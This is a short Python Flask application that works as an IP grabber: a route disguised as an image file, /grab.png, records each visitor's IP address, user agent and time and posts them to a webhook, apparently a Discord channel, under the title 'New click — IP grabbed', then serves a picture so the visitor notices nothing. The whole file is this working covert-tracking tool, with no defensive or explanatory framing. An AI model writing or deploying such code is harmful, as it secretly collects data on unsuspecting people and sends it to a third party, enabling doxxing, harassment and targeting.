from flask import Flask, request, send_from_directory
from datetime import datetime
import requests, os

app = Flask(__name__, static_folder='static')
WEBHOOK = os.getenv("WEBHOOK")  # we will set this in Railway settings

@app.route('/')
def home():
    return send_from_directory('static', 'index.html')

@app.route('/grab.png')
def grab():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', 'No UA')
    time = datetime.now().strftime("%H:%M:%S - %d/%m/%Y")

    payload = {
        "content": "@everyone",
        "embeds": [{
            "title": "New click — IP grabbed",
            "description": f"**IP** `{ip}`\n**User Agent** `{ua}`\n**Time** `{time}`",
            "color": 16711680,
            "thumbnail": {"url": "https://i.imgur.com/2D5jF9f.png"}
        }]
    }
    requests.post(WEBHOOK, json=payload)
    return send_from_directory('static', 'grab.png')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
